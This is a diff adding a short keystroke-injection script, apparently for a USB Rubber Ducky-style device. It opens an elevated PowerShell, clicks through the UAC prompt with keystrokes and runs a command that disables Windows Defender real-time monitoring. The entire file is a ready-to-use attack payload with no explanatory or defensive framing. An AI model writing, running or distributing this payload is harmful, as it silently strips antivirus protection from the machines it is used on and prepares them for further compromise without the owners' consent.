@@ -1,0 +1,12 @@
+GUI R
+DELAY 500
+STRING powershell
+DELAY 500
+CTRL-SHIFT ENTER
+DELAY 500
+SHIFT TAB
+DELAY 500
+ENTER
+DELAY 600
+STRING Set-MpPreference -DisableRealtimeMonitoring $true;exit
+ENTER
